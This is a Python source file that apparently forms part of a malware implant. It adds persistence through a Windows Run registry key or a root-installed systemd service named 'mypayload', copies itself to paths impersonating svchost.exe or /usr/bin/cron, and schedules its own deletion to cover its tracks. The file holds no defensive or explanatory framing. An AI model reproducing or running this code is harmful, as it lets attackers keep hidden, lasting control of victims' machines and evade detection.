import os
import platform
import shutil
import subprocess
import logging

def add_persistence(script_path):
    try:
        if platform.system() == "Windows":
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "MyPayload", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            logging.info("Persistence added to Windows registry.")
        elif platform.system() == "Linux":
            if os.geteuid() != 0:
                logging.error("Root privileges are required to add persistence on Linux.")
                return
            service_content = f"""[Unit]
Description=MyPayload Service

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            service_path = "/etc/systemd/system/mypayload.service"
            with open(service_path, "w") as f:
                f.write(service_content)
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", "mypayload.service"], check=True)
            subprocess.run(["systemctl", "start", "mypayload.service"], check=True)
            logging.info("Persistence added via systemd service.")
    except Exception as e:
        logging.error(f"Failed to add persistence: {e}")

def mimic_system_tool(script_path):
    try:
        if platform.system() == "Windows":
            target_path = os.path.expandvars(r"%WINDIR%\System32\svchost.exe")
        else:
            target_path = "/usr/bin/cron"
        if not os.path.exists(target_path):
            shutil.copy2(script_path, target_path)
            os.chmod(target_path, 0o755)
            logging.info(f"Copied payload to {target_path}")
    except Exception as e:
        logging.error(f"Failed to mimic system tool: {e}")

def self_delete(script_path):
    try:
        if platform.system() == "Windows":
            cmd = f'cmd /c ping 127.0.0.1 -n 5 > nul & del "{script_path}"'
            subprocess.Popen(cmd, shell=True)
        else:
            cmd = f"sh -c 'sleep 5 && rm -f \"{script_path}\"'"
            subprocess.Popen(cmd, shell=True)
        logging.info("Scheduled self-deletion.")
    except Exception as e:
        logging.error(f"Failed to schedule self-deletion: {e}")